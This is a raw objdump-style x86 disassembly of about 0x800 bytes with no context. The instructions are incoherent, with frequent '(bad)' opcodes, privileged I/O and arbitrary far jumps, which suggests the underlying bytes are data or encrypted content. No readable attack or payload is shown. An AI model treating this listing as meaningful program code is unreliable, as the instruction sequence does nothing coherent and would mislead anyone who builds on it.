  416dc5:	adc    BYTE PTR [esi+0x2c],dh
  416dc8:	push   0xf
  416dca:	adc    DWORD PTR ds:0x62ba120a,esp
  416dd0:	or     eax,0xc1b74b77
  416dd5:	and    ecx,DWORD PTR es:[ebp-0xf3d8700]
  416ddc:	pop    ss
  416ddd:	pop    eax
  416dde:	cmp    esp,DWORD PTR [esi-0x331aea55]
  416de4:	test   eax,0x4b2887eb
  416de9:	sub    al,0x25
  416deb:	mov    DWORD PTR [ecx+0x2b],ebp
  416dee:	mov    ds:0xd32ff5ce,al
  416df3:	adc    bl,BYTE PTR [ecx+ebx*1+0x100b64a6]
  416dfa:	push   0x4a56b788
  416dff:	mov    esi,0xd4a8d3aa
  416e04:	or     esi,esi
  416e06:	dec    esp
  416e07:	mov    dl,al
  416e09:	je     0x416e84
  416e0b:	inc    BYTE PTR [edx-0x67]
  416e0e:	push   ds
  416e0f:	retf   
  416e10:	fwait
  416e11:	aas    
  416e12:	mov    esp,0x6f9fe367
  416e17:	xchg   esi,eax
  416e18:	mov    esi,0x9272c67
  416e1d:	pop    edx
  416e1e:	imul   ecx,edi,0xc2e80d0d
  416e24:	push   edx
  416e25:	enter  0x2c38,0x58
  416e29:	pop    ebx
  416e2a:	push   es
  416e2b:	les    ebp,FWORD PTR [edi+0x2fc7d3a9]
  416e31:	shl    ch,0x5
  416e34:	outs   dx,DWORD PTR ds:[esi]
  416e35:	mov    eax,ds:0x563db237
  416e3a:	(bad)  
  416e3c:	mov    eax,0xc5317117
  416e41:	test   al,0xaa
  416e43:	in     al,0xca
  416e45:	and    bl,BYTE PTR [edi]
  416e47:	loop   0x416e7c
  416e49:	jecxz  0x416ea7
  416e4b:	inc    edx
  416e4c:	aas    
  416e4d:	pop    edx
  416e4e:	push   ecx
  416e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e50:	test   eax,0x1afc7427
  416e55:	bound  ecx,QWORD PTR [edi+0x6724866f]
  416e5b:	cmp    cl,BYTE PTR [ecx]
  416e5d:	loop   0x416e9d
  416e5f:	sar    BYTE PTR [ecx+0x5],cl
  416e62:	jae    0x416eca
  416e64:	hlt    
  416e65:	(bad)  
  416e66:	clc    
  416e67:	in     al,dx
  416e68:	sbb    BYTE PTR [di+0xf3e],cl
  416e6d:	add    BYTE PTR [edx+0xef5afce],dl
  416e73:	adc    al,0x39
  416e75:	add    eax,0x679498b7
  416e7a:	daa    
  416e7b:	ss pop edx
  416e7d:	test   DWORD PTR [ecx],0xa8cb6c5c
  416e83:	das    
  416e84:	das    
  416e85:	ror    BYTE PTR [eax+ebx*1+0x68f6c2cb],1
  416e8c:	neg    BYTE PTR [edi+0x30]
  416e8f:	(bad)  
  416e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e91:	bound  edi,QWORD PTR [esi-0x755a192a]
  416e97:	pop    ebx
  416e98:	stc    
  416e99:	xchg   esi,eax
  416e9a:	je     0x416ee3
  416e9c:	in     al,0xba
  416e9e:	aaa    
  416e9f:	and    BYTE PTR [edx-0xc5fa0ee],dh
  416ea5:	or     al,0x59
  416ea7:	aad    0x39
  416ea9:	mov    eax,DWORD PTR [eax+0x38fa5a00]
  416eaf:	dec    edi
  416eb0:	cli    
  416eb1:	mov    eax,ds:0x77d377b2
  416eb6:	or     al,0x18
  416eb8:	push   es
  416eb9:	ret    0xc06f
  416ebc:	(bad)  
  416ebd:	ror    DWORD PTR ds:0x4100f515,1
  416ec3:	call   0xdbf67fc
  416ec8:	popa   
  416ec9:	dec    ebp
  416eca:	lea    ebp,[esi+0x64]
  416ecd:	retf   0xdb7b
  416ed0:	xor    eax,0x3496f384
  416ed5:	neg    dh
  416ed7:	ficom  DWORD PTR [edx+edi*2+0x361c16e9]
  416ede:	mov    bh,0x27
  416ee0:	call   0x8fd3:0x616f8d1b
  416ee7:	out    dx,eax
  416ee8:	repz aam 0x87
  416eeb:	fucomp st(2)
  416eed:	test   eax,0x97555358
  416ef2:	imul   esi,DWORD PTR [edi],0x3a
  416ef5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ef7:	lea    esp,[eax]
  416ef9:	test   al,0x76
  416efb:	or     esi,ebx
  416efd:	outs   dx,DWORD PTR ds:[esi]
  416efe:	xchg   esp,eax
  416eff:	pop    esi
  416f00:	dec    esp
  416f01:	stos   BYTE PTR es:[edi],al
  416f02:	pop    esi
  416f03:	stos   DWORD PTR es:[edi],eax
  416f04:	aam    0xd5
  416f06:	retf   0xcd44
  416f09:	clc    
  416f0a:	push   ss
  416f0b:	out    dx,eax
  416f0c:	dec    esp
  416f0d:	dec    ecx
  416f0e:	or     BYTE PTR [esi+0x46],dl
  416f11:	adc    al,0xbf
  416f13:	push   edx
  416f14:	test   eax,0xf126f9b2
  416f19:	and    BYTE PTR [ebx-0x2a],dh
  416f1c:	rol    DWORD PTR [eax-0x19],1
  416f1f:	dec    edi
  416f20:	frstor [eax+0x6ba350ab]
  416f26:	sbb    dl,BYTE PTR [ecx-0x13]
  416f29:	mov    esp,0xcab0d430
  416f2e:	or     BYTE PTR [edx-0x7d0d65e4],dl
  416f34:	in     eax,0x8
  416f36:	ss mov ecx,0x7a5e6d36
  416f3c:	sub    DWORD PTR [edi-0x227853e0],0x2
  416f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f44:	cmp    DWORD PTR [esi+0x6b3c6fe2],0x17
  416f4b:	imul   ebx,esi,0xffffffd1
  416f4e:	out    0x57,al
  416f50:	addr16 adc al,0xd2
  416f53:	and    esi,0xae508d42
  416f59:	dec    ecx
  416f5a:	sbb    BYTE PTR [edi-0x6d],al
  416f5d:	mov    dl,0xa2
  416f5f:	pop    edi
  416f60:	push   0xffffffcc
  416f62:	mov    ch,0x68
  416f64:	je     0x416f35
  416f66:	shr    BYTE PTR [ebp-0x6ff43848],0xf6
  416f6d:	js     0x416f21
  416f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f70:	cmc    
  416f71:	push   esp
  416f72:	les    ebp,FWORD PTR [esi+ebp*4+0xa]
  416f76:	les    esi,FWORD PTR [ebp-0x63798ce7]
  416f7c:	pop    esp
  416f7d:	pushf  
  416f7e:	hlt    
  416f7f:	and    BYTE PTR [edx-0xe],dh
  416f82:	cmp    DWORD PTR [ebx],ebx
  416f84:	adc    al,0x82
  416f86:	mov    ecx,0x3f6fd7f3
  416f8b:	nop
  416f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f8d:	add    DWORD PTR [eax+0x37],0x3ed36b6d
  416f94:	jbe    0x41700e
  416f96:	mov    esi,0x83512307
  416f9b:	lods   eax,DWORD PTR ds:[esi]
  416f9c:	add    BYTE PTR [ebp+0x582576d],dh
  416fa2:	dec    edx
  416fa3:	enter  0x350,0xda
  416fa7:	leave  
  416fa8:	in     al,0xd
  416faa:	or     BYTE PTR [edi-0x5c],0x39
  416fae:	add    esi,eax
  416fb0:	(bad)  
  416fb1:	enter  0x70fc,0x5e
  416fb5:	jmp    FWORD PTR [ecx+0x4a]
  416fb8:	jmp    0x416fc0
  416fba:	cs pusha 
  416fbc:	mov    ecx,0x8bcd6fb8
  416fc1:	lea    esp,[ebp+0x2fbf3a1a]
  416fc7:	adc    cl,BYTE PTR [edx]
  416fc9:	ss mov ch,0x76
  416fcc:	sbb    DWORD PTR [ecx-0x4c],edi
  416fcf:	mov    dh,0xc3
  416fd1:	xchg   esp,ebx
  416fd3:	sub    bh,dh
  416fd5:	mov    WORD PTR ds:0x75c80a7f,gs
  416fdb:	xor    BYTE PTR [eax+edx*2],al
  416fde:	pop    ecx
  416fdf:	ret    
  416fe0:	retf   
  416fe1:	loop   0x417020
  416fe3:	in     al,0xb3
  416fe5:	xlat   BYTE PTR ds:[ebx]
  416fe6:	adc    eax,0xfa1bf6e7
  416feb:	std    
  416fec:	push   ecx
  416fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fee:	pushf  
  416fef:	push   esp
  416ff0:	jae    0x45ae735e
  416ff6:	mov    BYTE PTR [esi+0x10],bl
  416ff9:	pop    edi
  416ffa:	mov    eax,0x28e1e382
  416fff:	jg     0x416fd3
  417001:	adc    BYTE PTR [edi-0x72e82d6a],al
  417007:	sar    BYTE PTR [ecx-0x76],cl
  41700a:	mov    ebp,0x9e9a7045
  41700f:	sub    cl,BYTE PTR [eax+0x30750a74]
  417015:	inc    edi
  417016:	lods   al,BYTE PTR ds:[esi]
  417017:	jge    0x416fff
  417019:	jecxz  0x417036
  41701b:	cwde   
  41701c:	call   0x4bd255d1
  417021:	cli    
  417022:	scas   eax,DWORD PTR es:[edi]
  417023:	mov    esi,0xcc87a60
  417028:	push   edi
  417029:	pop    ds
  41702a:	setg   ch
  41702d:	inc    esp
  41702e:	push   edi
  41702f:	inc    edx
  417030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417031:	push   esi
  417032:	sub    BYTE PTR [edx-0x2f],dh
  417035:	sbb    eax,0x2590e249
  41703a:	mov    eax,0x76f51579
  41703f:	data16 js 0x417016
  417042:	ss push edx
  417044:	dec    eax
  417045:	aam    0x9b
  417047:	(bad)  
  417048:	push   esi
  417049:	push   ebx
  41704a:	dec    edx
  41704b:	add    BYTE PTR [ebx],al
  41704d:	and    BYTE PTR [ecx-0x4297b3a9],ah
  417053:	and    dl,BYTE PTR [ecx+esi*8+0x75]
  417057:	jae    0x417050
  417059:	lds    ebx,FWORD PTR [esi+edi*1-0x51]
  41705d:	xor    BYTE PTR [esi],bl
  41705f:	inc    esi
  417060:	mov    ecx,gs
  417062:	add    ah,dh
  417064:	ins    BYTE PTR es:[edi],dx
  417065:	mov    al,0x84
  417067:	lds    eax,FWORD PTR [edi+0x55]
  41706a:	mov    ds:0xd4deb3c9,al
  41706f:	lock inc eax
  417071:	push   ecx
  417072:	push   esi
  417073:	jl     0x417052
  417075:	mov    bh,0xbd
  417077:	lahf   
  417078:	mov    ds:0x94607292,al
  41707d:	shr    DWORD PTR [ebp-0x3a],0x2b
  417081:	(bad)  
  417082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417083:	popa   
  417084:	sti    
  417085:	inc    edx
  417086:	xlat   BYTE PTR ds:[ebx]
  417087:	call   0x137c:0xcd488245
  41708e:	retf   0x6446
  417091:	mov    DWORD PTR [edx-0x80],edx
  417094:	ins    DWORD PTR es:[edi],dx
  417095:	mov    edi,0x5f6966ae
  41709a:	(bad)  
  41709c:	mov    cl,0x16
  41709e:	sub    esi,DWORD PTR [ebx-0x23]
  4170a1:	fiadd  DWORD PTR [eax+0x3d2f80f]
  4170a7:	mov    esp,DWORD PTR [ebp+ebp*8-0x27]
  4170ab:	jbe    0x4170c6
  4170ad:	in     eax,0xec
  4170af:	inc    esp
  4170b0:	sub    DWORD PTR [ebp-0x49],esp
  4170b3:	xchg   edx,eax
  4170b4:	std    
  4170b5:	jmp    0xcce90433
  4170ba:	pop    ebx
  4170bb:	sub    eax,0x5a055a8f
  4170c0:	sbb    DWORD PTR [ebp+0x124b6b2d],ebx
  4170c6:	mov    ecx,0xb025425d
  4170cb:	jl     0x4170f7
  4170cd:	js     0x417137
  4170cf:	xchg   DWORD PTR ds:0x51e1ea45,edx
  4170d5:	mov    dh,0xed
  4170d7:	fcmove st,st(5)
  4170d9:	dec    ebx
  4170da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170db:	pusha  
  4170dc:	and    al,0x4d
  4170de:	mov    ds:0x8df47cfa,al
  4170e3:	psubd  mm2,mm0
  4170e6:	retf   
  4170e7:	aas    
  4170e8:	jp     0x4170ea
  4170ea:	dec    edx
  4170eb:	dec    eax
  4170ec:	mov    eax,cs
  4170ee:	cmc    
  4170ef:	cmc    
  4170f0:	push   esp
  4170f1:	xchg   edi,eax
  4170f2:	rol    BYTE PTR [esp+edx*1-0x62ad2c71],cl
  4170f9:	pop    ebx
  4170fa:	fld    QWORD PTR [edx-0x47]
  4170fd:	push   eax
  4170fe:	mul    DWORD PTR [esi-0x44f6f7ef]
  417104:	sbb    eax,0xbcc5c4f4
  417109:	mov    BYTE PTR ds:0xb787d9e9,dl
  41710f:	pop    ebp
  417110:	pop    es
  417111:	adc    al,0x6f
  417113:	sub    ch,ah
  417115:	test   al,0x5a
  417117:	clc    
  417118:	xchg   edx,eax
  417119:	test   al,0x76
  41711b:	or     al,0xc9
  41711d:	xor    DWORD PTR [esi],0xaa7a57e3
  417123:	xchg   ecx,eax
  417124:	mov    bl,0x61
  417126:	xchg   cx,ax
  417128:	repz inc eax
  41712a:	(bad)  
  41712b:	adc    edx,DWORD PTR [edx]
  41712d:	sbb    BYTE PTR [esi-0x45],bl
  417130:	in     eax,dx
  417131:	dec    edi
  417132:	inc    edi
  417133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417134:	scas   eax,DWORD PTR es:[edi]
  417135:	(bad)  
  417136:	call   0x14110b40
  41713b:	push   esp
  41713c:	ins    DWORD PTR es:[edi],dx
  41713d:	jge    0x41718d
  41713f:	push   edx
  417140:	cs dec edi
  417142:	mov    ch,0x16
  417144:	mov    ds:0xa84aa43e,al
  417149:	pop    ds
  41714a:	test   eax,0x37049659
  41714f:	(bad)  
  417150:	icebp  
  417151:	push   ecx
  417152:	das    
  417153:	jmp    0x9f718140
  417158:	(bad)  [edx+0x38]
  41715b:	call   0x5327:0x5f983d6
  417162:	jp     0x41713f
  417164:	or     al,0x4f
  417166:	jmp    0x1506:0xe315fb81
  41716d:	jno    0x417187
  41716f:	out    0x3c,eax
  417171:	icebp  
  417172:	aaa    
  417173:	loopne 0x417108
  417175:	into   
  417176:	mov    edx,0xa5978146
  41717b:	jecxz  0x417163
  41717d:	xchg   edx,eax
  41717e:	or     dl,al
  417180:	pop    edx
  417181:	lock in al,dx
  417183:	adc    DWORD PTR [ecx],edx
  417185:	int3   
  417186:	xor    eax,0xb8d9d4f6
  41718b:	dec    edx
  41718c:	push   ebx
  41718d:	(bad)  
  41718e:	iret   
  41718f:	xor    edi,edx
  417191:	repz mov eax,0x10b803d0
  417197:	mov    dl,0xfa
  417199:	out    0x9d,al
  41719b:	cmp    bl,0xa8
  41719e:	xor    DWORD PTR ds:0xe55bdde9,0x69
  4171a5:	test   DWORD PTR [eax+0x202480a5],esi
  4171ab:	jecxz  0x417182
  4171ad:	pop    ss
  4171ae:	outs   dx,BYTE PTR ds:[esi]
  4171af:	dec    eax
  4171b0:	cmp    eax,0x3ece5ba9
  4171b5:	jbe    0x4171cf
  4171b7:	mov    eax,0x8b784ba8
  4171bc:	push   esp
  4171bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171be:	test   BYTE PTR [edi-0x56],dl
  4171c1:	loopne 0x41719d
  4171c3:	ins    BYTE PTR es:[edi],dx
  4171c4:	add    eax,0xbfc0aed8
  4171c9:	inc    edx
  4171ca:	jbe    0x417218
  4171cc:	cli    
  4171cd:	jmp    0x41722d
  4171cf:	xor    DWORD PTR [eax-0x5b],ecx
  4171d2:	cld    
  4171d3:	int    0x99
  4171d5:	ins    DWORD PTR es:[edi],dx
  4171d6:	sbb    eax,0xea28d440
  4171db:	repz fsubr QWORD PTR [esi+ebp*4-0xd]
  4171e0:	in     eax,dx
  4171e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171e2:	std    
  4171e3:	punpcklbw mm0,mm0
  4171e6:	add    BYTE PTR [ecx-0x4c85efd4],0x7a
  4171ed:	pop    esp
  4171ee:	icebp  
  4171ef:	aaa    
  4171f0:	rcl    BYTE PTR [edx+0x30d9bd8e],0xcd
  4171f7:	jne    0x4171ab
  4171f9:	and    BYTE PTR [eax+0x380c49da],bh
  4171ff:	xor    BYTE PTR [esi+eiz*8+0x56e88f37],al
  417206:	sub    al,0xaa
  417208:	mov    eax,0xd0c418c2
  41720d:	lds    esp,FWORD PTR [ebx]
  41720f:	cld    
  417210:	cmp    cl,bl
  417212:	xor    DWORD PTR [eax-0x6d],esp
  417215:	mov    bl,0xf4
  417217:	add    al,0xf3
  417219:	popf   
  41721a:	leave  
  41721b:	int3   
  41721c:	out    dx,al
  41721d:	jl     0x41724e
  41721f:	add    eax,0x73fa7319
  417224:	addr16 pop es
  417226:	mov    ebx,0x53093be3
  41722b:	xor    al,0x51
  41722d:	jb     0x417259
  41722f:	fdivr  DWORD PTR [eax-0x2c]
  417232:	imul   edx,DWORD PTR [edi+0x203c653d],0x72d8e1ba
  41723c:	mov    cl,0xce
  41723e:	sbb    DWORD PTR [edi-0x5c],eax
  417241:	into   
  417242:	jns    0x4171ef
  417244:	dec    esi
  417245:	sbb    DWORD PTR [esi],esi
  417247:	mov    ebx,0x3cf3c2c5
  41724c:	sub    al,0x6f
  41724e:	xchg   ecx,eax
  41724f:	cmp    dl,BYTE PTR [esi+0x51b14031]
  417255:	xchg   esp,eax
  417256:	mov    al,ds:0x46a7a65f
  41725b:	fwait
  41725c:	mov    esi,0x15f5bf0f
  417261:	loopne 0x4172b7
  417263:	hlt    
  417264:	add    al,0x99
  417266:	(bad)  
  417267:	shl    DWORD PTR [ebp+0x2f],cl
  41726a:	rcr    BYTE PTR [edx],cl
  41726c:	cmp    al,0xe8
  41726e:	fdivr  DWORD PTR [esi-0x2a]
  417271:	int    0x74
  417273:	push   cs
  417274:	push   ax
  417276:	(bad)
  41727a:	push   cs
  41727b:	push   es
  41727c:	imul   BYTE PTR [edi+0x616568ac]
  417282:	shl    BYTE PTR [ebx],1
  417284:	cmp    BYTE PTR [esp+ecx*2+0x7a],dh
  417288:	in     al,dx
  417289:	scas   eax,DWORD PTR es:[edi]
  41728a:	pusha  
  41728b:	cld    
  41728c:	jmp    0x8c00ab1
  417291:	mov    ebx,0x17c2aa04
  417296:	test   bh,dl
  417298:	aad    0xba
  41729a:	mov    bh,0xec
  41729c:	(bad)  
  41729d:	not    BYTE PTR [edi-0x7e990330]
  4172a3:	enter  0x4b11,0xa
  4172a7:	jge    0x417271
  4172a9:	rcl    DWORD PTR [ebx-0x3a],1
  4172ac:	rol    DWORD PTR [ecx-0x6c6db175],0xbb
  4172b3:	adc    DWORD PTR [ebp+0x79],esp
  4172b6:	sti    
  4172b7:	fild   QWORD PTR [eax-0x5d25081]
  4172bd:	mov    ebp,edx
  4172bf:	mov    ah,0x16
  4172c1:	data16 or BYTE PTR [esi],ah
  4172c4:	pminub mm3,QWORD PTR [esi+0x69]
  4172c8:	mov    bl,0xfe
  4172ca:	lahf   
  4172cb:	inc    ebx
  4172cc:	xor    dl,al
  4172ce:	gs lock and eax,0x7f6d9d17
  4172d5:	pop    ds
  4172d6:	add    DWORD PTR [eax-0x6f3fc196],0xd9fb5043
  4172e0:	adc    DWORD PTR [esi+esi*4+0x63],ebp
  4172e4:	ss imul edi,edi,0x4
  4172e8:	out    0x90,eax
  4172ea:	retf   
  4172eb:	int3   
  4172ec:	sti    
  4172ed:	inc    ebx
  4172ee:	jnp    0x4172f7
  4172f0:	cmp    DWORD PTR [edx+0x6f9911b],ebp
  4172f6:	idiv   ebp
  4172f8:	add    al,0x6
  4172fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172fb:	aad    0x38
  4172fd:	push   ecx
  4172fe:	(bad)  [ebx+0x5d5629f6]
  417304:	(bad)  
  417306:	and    DWORD PTR [edi+0x2],0xffffff85
  41730a:	ss js  0x4172df
  41730d:	jno    0x4172d2
  41730f:	test   eax,0xd5bbbedf
  417314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417315:	xor    DWORD PTR ds:[eax+0x7e2749ec],edx
  41731c:	shl    BYTE PTR [edi],1
  41731e:	pop    edi
  41731f:	xchg   ebp,eax
  417320:	fwait
  417321:	stos   DWORD PTR es:[edi],eax
  417322:	and    ecx,DWORD PTR [ecx]
  417324:	jmp    0x2a61f89a
  417329:	pop    ebx
  41732a:	ficomp DWORD PTR [ecx+ecx*4+0x2139130b]
  417331:	mov    bl,0xd2
  417333:	pushf  
  417334:	adc    esi,DWORD PTR [ebx]
  417336:	mov    ss,esp
  417338:	mov    esi,0x544eec0c
  41733d:	xor    BYTE PTR [edi+0x27],dl
  417340:	loop   0x4172e0
  417342:	cmp    bh,dh
  417344:	cmp    bh,BYTE PTR [ebp-0x7d]
  417347:	test   DWORD PTR [ecx-0x2e445e73],esi
  41734d:	imul   esi,ebp,0xffffff8c
  417350:	mov    esp,0x8ff65ff0
  417355:	push   ds
  417356:	jns    0x41739a
  417358:	loop   0x4173c4
  41735a:	mov    ch,0x68
  41735c:	adc    BYTE PTR [ebx-0x6a],ah
  41735f:	icebp  
  417360:	(bad)  
  417361:	push   ebp
  417362:	lods   eax,DWORD PTR ds:[esi]
  417363:	add    edi,DWORD PTR [edx+ecx*2-0x2f3260d]
  41736a:	mov    ebx,0xf9174afc
  41736f:	adc    DWORD PTR [eax+ebp*2],0x6d8b605c
  417376:	neg    BYTE PTR [ecx+0x6e352208]
  41737c:	into   
  41737d:	xor    DWORD PTR [eax+ecx*2+0x32dd90e9],ebx
  417384:	aaa    
  417385:	dec    ebp
  417386:	xor    DWORD PTR [edi],ebp
  417388:	push   ss
  417389:	push   es
  41738a:	(bad)  
  41738b:	fs out dx,eax
  41738d:	jg     0x4173c2
  41738f:	inc    ecx
  417390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417391:	test   al,0x59
  417393:	sub    DWORD PTR [ebx+0x2fb41416],ecx
  417399:	ins    DWORD PTR es:[edi],dx
  41739a:	xchg   edx,eax
  41739b:	fisub  WORD PTR [eax-0x753a28d6]
  4173a1:	inc    esp
  4173a2:	mov    ah,0xdd
  4173a4:	jge    0x4173bc
  4173a6:	lock sub eax,esp
  4173a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173aa:	in     eax,dx
  4173ab:	inc    BYTE PTR [edi+0x51]
  4173ae:	scas   eax,DWORD PTR es:[edi]
  4173af:	mov    esi,0xe80ca9c4
  4173b4:	mov    dh,0xeb
  4173b6:	inc    ebp
  4173b7:	sbb    DWORD PTR [ebx+0x6],ecx
  4173ba:	and    esp,esi
  4173bc:	das    
  4173bd:	dec    ebp
  4173be:	scas   al,BYTE PTR es:[edi]
  4173bf:	rcl    BYTE PTR [ecx+0x44eda9d1],0xf8
  4173c6:	pop    ss
  4173c7:	outs   dx,DWORD PTR ds:[esi]
  4173c8:	fst    st(5)
  4173ca:	dec    edx
  4173cb:	or     al,0x7b
  4173cd:	retf   
  4173ce:	loope  0x41744c
  4173d0:	mov    ah,0xaa
  4173d2:	rcl    BYTE PTR [ebx+0x33],cl
  4173d5:	call   0x88e03f2c
  4173da:	or     al,0x97
  4173dc:	ror    BYTE PTR [esi],0x65
  4173df:	mov    DWORD PTR ds:0xee3b9489,eax
  4173e5:	push   esp
  4173e6:	arpl   WORD PTR [ecx+ebx*4+0x1a547d38],sp
  4173ed:	xchg   edi,eax
  4173ee:	mov    ebp,0x38b75219
  4173f3:	loope  0x417463
  4173f5:	cld    
  4173f6:	mov    DWORD PTR [edx+0x6a052f39],ebx
  4173fc:	sbb    ebp,esp
  4173fe:	inc    ecx
  4173ff:	gs push es
  417401:	test   BYTE PTR [edx],ah
  417403:	xchg   esp,eax
  417404:	sub    BYTE PTR [ebp+0x27],ch
  417407:	mov    ds:0x154cb6b1,al
  41740c:	mov    al,0x5
  41740e:	call   0xf8fa:0x5caf7fa5
  417415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417416:	call   0xfc29ba07
  41741b:	and    dh,BYTE PTR [edx+0x35]
  41741e:	cdq    
  41741f:	sbb    bh,ch
  417421:	fiadd  DWORD PTR [edi+0x25]
  417424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417425:	cmp    DWORD PTR [ebx-0x7c],edi
  417428:	out    dx,al
  417429:	out    dx,al
  41742a:	dec    edx
  41742b:	test   eax,0xf71bcbd4
  417430:	(bad)  
  417431:	ins    DWORD PTR es:[edi],dx
  417432:	mov    dh,0x6d
  417434:	jne    0x4173fd
  417436:	call   0xdfb53cf
  41743b:	xchg   ebp,eax
  41743c:	sbb    ecx,eax
  41743e:	jge    0x417431
  417440:	cmc    
  417441:	inc    eax
  417442:	adc    eax,0x8c4d0132
  417447:	retf   0x1846
  41744a:	lahf   
  41744b:	dec    ebx
  41744c:	test   eax,0x3fee3a5e
  417451:	adc    DWORD PTR [esi],esi
  417453:	imul   eax,esi,0x2044e68a
  417459:	test   al,0xd7
  41745b:	(bad)  
  41745c:	retf   0x3509
  41745f:	stos   DWORD PTR es:[edi],eax
  417460:	push   eax
  417461:	call   0xbc369ffe
  417466:	jnp    0x417424
  417468:	pusha  
  417469:	cmc    
  41746a:	cmp    al,0x94
  41746c:	stos   DWORD PTR es:[edi],eax
  41746d:	fwait
  41746e:	shl    BYTE PTR [ecx+eax*2],cl
  417471:	or     BYTE PTR [eax+0x4],al
  417474:	pop    ds
  417475:	clc    
  417476:	push   cs
  417477:	int    0x64
  417479:	push   edx
  41747a:	outs   dx,DWORD PTR ds:[esi]
  41747b:	lds    ecx,FWORD PTR [edi-0x41ad6d87]
  417481:	dec    edi
  417482:	dec    edi
  417483:	mov    ah,0x7a
  417485:	(bad)  
  417486:	mov    edi,0x7129b5f2
  41748b:	xor    eax,0x63adf2bb
  417490:	or     al,0x55
  417492:	pop    ebx
  417493:	les    eax,FWORD PTR [ebx+ecx*2-0x14]
  417497:	inc    esp
  417498:	fwait
  417499:	mov    ecx,0x337f562a
  41749e:	sahf   
  41749f:	nop
  4174a0:	mov    ah,0xe5
  4174a2:	sbb    BYTE PTR [edx+0x653d88c1],dh
  4174a8:	adc    ch,BYTE PTR [edx-0x787e0e68]
  4174ae:	in     eax,0x57
  4174b0:	test   BYTE PTR [edx-0x16],0xa6
  4174b4:	adc    BYTE PTR [ebx+0x69],0x1d
  4174b8:	retf   0xee42
  4174bb:	fs cs or eax,0xcf0f14ef
  4174c2:	xchg   DWORD PTR [esi],edx
  4174c4:	sbb    eax,0xbd902ae4
  4174c9:	mov    ah,0xf5
  4174cb:	push   0xffffffd4
  4174cd:	mov    dl,BYTE PTR [edi+0x55]
  4174d0:	lock mov ch,0xde
  4174d3:	sub    al,0x7
  4174d5:	push   edx
  4174d6:	les    esi,FWORD PTR [edi+0x6382e3e0]
  4174dc:	or     DWORD PTR [esi+edi*2+0x47],esp
  4174e0:	das    
  4174e1:	ss xchg edi,eax
  4174e3:	std    
  4174e4:	adc    BYTE PTR [ebx+0x303e995e],bl
  4174ea:	jg     0x41748b
  4174ec:	je     0x4174f4
  4174ee:	pop    edi
  4174ef:	int3   
  4174f0:	rcr    BYTE PTR [eax],0xe6
  4174f3:	loop   0x41750f
  4174f5:	jp     0x4174d9
  4174f7:	fidivr DWORD PTR [ecx-0x61]
  4174fa:	lds    ecx,FWORD PTR [ecx]
  4174fc:	mov    bl,BYTE PTR [edi+0x70]
  4174ff:	sbb    ch,0xd7
  417502:	inc    eax
  417503:	int    0x77
  417505:	add    al,0x6c
  417507:	std    
  417508:	lahf   
  417509:	jle    0x417533
  41750b:	(bad)  
  41750c:	push   edi
  41750d:	dec    ecx
  41750e:	gs inc ecx
  417510:	je     0x41751e
  417512:	xor    edx,DWORD PTR [eax+0x13ad5c53]
  417518:	into   
  417519:	jg     0x417503
  41751b:	int3   
  41751c:	adc    cl,ch
  41751e:	mov    ecx,0xbb6fa0d3
  417523:	adc    al,BYTE PTR [esi]
  417525:	add    BYTE PTR [esi],bh
  417527:	cmp    edi,DWORD PTR [esi+0x2b6cbaa6]
  41752d:	mov    ch,BYTE PTR [edx-0xa]
  417530:	jns    0x41758e
  417532:	into   
  417533:	mov    dh,0x47
  417535:	add    dh,bh
  417537:	dec    edi
  417538:	cmc    
  417539:	cmp    ah,BYTE PTR [eax+0x7d2f44dd]
  41753f:	fwait
  417540:	cld    
  417541:	sub    ebx,DWORD PTR [eax-0x144957be]
  417547:	jp     0x41753e
  417549:	(bad)  
  41754a:	shl    BYTE PTR [esi+0x70],0x91
  41754e:	and    bl,0x4
  417551:	je     0x417595
  417553:	(bad)  
  417554:	fs ret 
  417556:	not    DWORD PTR [edx]
  417558:	xor    DWORD PTR [eax+0x2833435e],edx
  41755e:	cmc    
  41755f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417560:	pop    ebp
  417561:	(bad)  
  417562:	(bad)  
  417563:	mov    bl,0xc
  417565:	adc    dl,BYTE PTR [edx-0x6c537744]
  41756b:	and    eax,0x35a706a
  417570:	pushf  
  417571:	sub    eax,DWORD PTR ds:0x4a8f373
  417577:	xchg   ecx,eax
  417578:	shr    BYTE PTR [ebp+0x33],1
  41757b:	mov    edi,edi
  41757d:	aam    0xcb
  41757f:	in     al,0xc5
  417581:	mov    ch,0x94
  417583:	scas   al,BYTE PTR es:[edi]
  417584:	cmp    cl,BYTE PTR [ebx-0x57e8c54]
  41758a:	and    edi,DWORD PTR [edi+0x5e]
  41758d:	inc    ecx
  41758e:	mov    esi,0xb8e3f73f
  417593:	stos   DWORD PTR es:[edi],eax
  417594:	sub    dh,0xbc
  417597:	sbb    al,0x8b
  417599:	xor    esp,esi
  41759b:	push   sp
  41759d:	test   eax,0x1c14e569
  4175a2:	(bad)  [eax-0x334ec5a5]
  4175a8:	sti    
  4175a9:	jp     0x417581
  4175ab:	mov    al,0x49
  4175ad:	out    dx,eax
  4175ae:	fldenv [edi+eax*2-0x669ff1]
  4175b5:	psubusw mm2,QWORD PTR [esi+0x6d3c40bb]
  4175bc:	sar    BYTE PTR [ebp+0x4e],cl
  4175bf:	data16 adc al,0x36
  4175c2:	or     dh,ah
  4175c4:	dec    ebx
  4175c5:	(bad)  [ecx-0x3aa222e7]
